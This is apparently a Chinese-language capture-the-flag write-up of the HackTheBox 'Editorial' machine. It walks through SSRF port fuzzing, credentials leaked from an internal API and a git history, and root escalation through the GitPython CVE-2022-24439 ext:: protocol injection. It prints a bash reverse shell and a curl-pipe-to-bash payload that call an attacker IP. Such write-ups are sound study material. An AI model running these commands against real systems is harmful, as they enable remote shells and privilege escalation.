# Editorial

端口扫描

![image-20240801094919849](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801094919849.png)



80

![image-20240801094735655](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801094735655.png)



![image-20240801094857650](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801094857650.png)

![image-20240801095038649](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801095038649.png)



子域名枚举

```
ffuf -u http://editorial.htb/ -w /home/kali/Desktop/pass/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 178,0 -t 128 -H "HOST: FUZZ.editorial.htb"
```

![image-20240801095725645](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801095725645.png)

目录扫描

![image-20240801095745618](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801095745618.png)



/about页面发现子域名timepoarriba.htb

![image-20240801100602678](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801100602678.png)

访问之后会重定向到editorial.htb

![image-20240801100836840](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801100836840.png)



![image-20240801111020827](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801111020827.png)

![image-20240801111032357](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801111032357.png)

生成端口字典开始枚举本地端口

```
 crunch 1 5 0123456789 >>ports.txt
```

![image-20240801110838943](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801110838943.png)

```
ffuf -request request -w ports.txt -v -c -request-proto http -fs 61,0 -t 128

```



```
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data;application/x-www-form-urlencoded; boundary=---------------------------313643230924860332522144103370
Content-Length: 364
Origin: http://editorial.htb
Connection: close
Referer: http://editorial.htb/upload

-----------------------------313643230924860332522144103370
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
-----------------------------313643230924860332522144103370
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------313643230924860332522144103370--
```

发现5000端口有东西

![image-20240801111624936](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801111624936.png)

![image-20240801111753094](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801111753094.png)

注意到虽然发的是同一个数据包，但回显却不一样，有些回显的路径有内容，有的则没有

![image-20240801112337031](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801112337031.png)

用jq处理一下json文本

```
jq is a lightweight and flexible command-line JSON processor akin to sed,awk,grep, and friends for JSON data. It's written in portable C and has zero runtime dependencies, allowing you to easily slice, filter, map, and transform structured data.
```

```
cat api|jq '.'
```

![image-20240801112816003](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801112816003.png)



访问/api/latest/metadata/messages/authors这个接口

![image-20240801113236741](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801113236741.png)

得到一些重要信息

```
Username: dev
Password: dev080217_devAPI!@
```

![image-20240801113257986](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801113257986.png)

尝试ssh登录

![image-20240801113513457](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801113513457.png)

尝试提取

![image-20240801113722004](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801113722004.png)

![image-20240801113800953](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801113800953.png)

上传linpeas.sh

![image-20240801113956006](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801113956006.png)

没有发现有用信息

dev用户下有个.git文件夹

```
git log
```

![image-20240801141454381](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801141454381.png)

```
git diff 3251 1e84
```

![image-20240801141735353](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801141735353.png)

发现prod账户密码

```
Username: prod
Password: 080217_Producti0n_2023!@
```

尝试ssh登录

![image-20240801141911721](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801141911721.png)



查看可执行的sudo命令

![image-20240801142007931](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801142007931.png)

查看/opt/internal_apps/clone_changes/clone_prod_change.py

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

注解

```
这是一个使用 Python 和 GitPython 库的脚本。以下是一行一行的解释这段代码：
#!/usr/bin/python3 这个是一个称为 shebang（或 hashbang）的特殊行，它告诉系统应使用哪个解释器来执行脚本。在这里，我们指定脚本将由位于 /usr/bin/python3 的 Python 3 解释器执行。
import os 和 import sys 这两行导入了 Python 的标准库模块 os 和 sys。os 模块用于与操作系统交互，sys 模块用于处理 Python 运行时环境的一些操作，如获取命令行参数。
from git import Repo 这一行导入了 GitPython 库的 Repo 类，用于操作 Git 仓库。
os.chdir('/opt/internal_apps/clone_changes') 这行代码使用 os 模块的 chdir 函数将当前工作目录修改为 /opt/internal_apps/clone_changes。
url_to_clone = sys.argv[1] 这行代码取命令行的第一个参数（在 Python 中，索引从 0 开始，sys.argv[0] 是脚本名，因此 sys.argv[1] 是第一个参数），并将其存储在 url_to_clone 中。
r = Repo.init('', bare=True) 这行代码创建了一个新的 Repo 对象（一个代表 Git 仓库的对象），并以 "bare" 模式初始化它。在 Git 中，一个 "bare" 仓库是没有工作目录的仓库，只包含 Git 内部的数据。
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"]) 这行代码从 url_to_clone 中克隆一个 Git 仓库，并将其作为名为 "new_changes" 的新目录。multi_options 参数中传入了一个允许所有协议的配置项。
```

这段代码存在漏洞CVE-2022-24439，poc(https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)

现在本地创建一个shell.sh文件，内容如下

```
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.23/1223 0>&1'
```

![image-20240801142913767](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801142913767.png)



在靶机上执行poc

```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c curl% http://10.10.16.23:9090/shell.sh|bash >&2'
```

![image-20240801143100673](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801143100673.png)

![image-20240801143119413](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801143119413.png)



